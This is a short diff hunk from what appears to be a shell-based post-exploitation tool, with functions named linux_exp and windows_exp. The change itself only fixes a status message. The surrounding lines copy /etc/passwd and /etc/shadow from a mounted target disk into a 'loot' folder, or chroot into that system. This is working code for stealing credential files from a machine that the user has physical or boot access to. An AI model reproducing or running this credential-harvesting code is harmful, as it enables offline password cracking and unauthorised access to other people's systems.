@@ -44,7 +44,7 @@ function linux_exp() {
         [ $SEL = 1 ] && $(cp -r /mnt/etc/passwd $LOOT_FOLDER/passwd; cp -r /mnt/etc/shadow $LOOT_FOLDER/shadow)
         [ $SEL = 2 ] && chroot /mnt
 
-        echo -e "\e[1;31m[!]\e[m All of the ouput and results are inside of /tmp/ :)"
+        echo -e "\e[1;31m[!]\e[m All of the ouput and results are inside of $LOOT_FOLDER :)"
 }
 
 function windows_exp() {
